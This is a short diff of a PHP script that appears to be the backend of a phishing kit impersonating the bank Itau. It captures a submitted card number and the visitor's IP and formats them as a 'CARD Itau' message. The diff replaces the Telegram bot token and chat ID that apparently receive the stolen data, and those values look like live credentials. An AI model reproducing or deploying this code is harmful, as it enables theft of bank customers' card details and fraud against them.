@@ -9,8 +9,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $ip = $_SERVER['REMOTE_ADDR'];
 
     // Token y Chat ID de Telegram
-    $token = "7940181081:AAFuFg6fKQqkBvM8YF_ML-_ly4XaMOk1meY";
-    $chatId = "5157616506";
+    $token = "7632972589:AAFRzRlHYr8nWKXTYj4w7TqLS4VLwV_XXns";
+    $chatId = "-1002365815581";
 
     // Mensaje a enviar
     $message = "CARD Itau: \nCC: $Fnum \nIP: $ip";
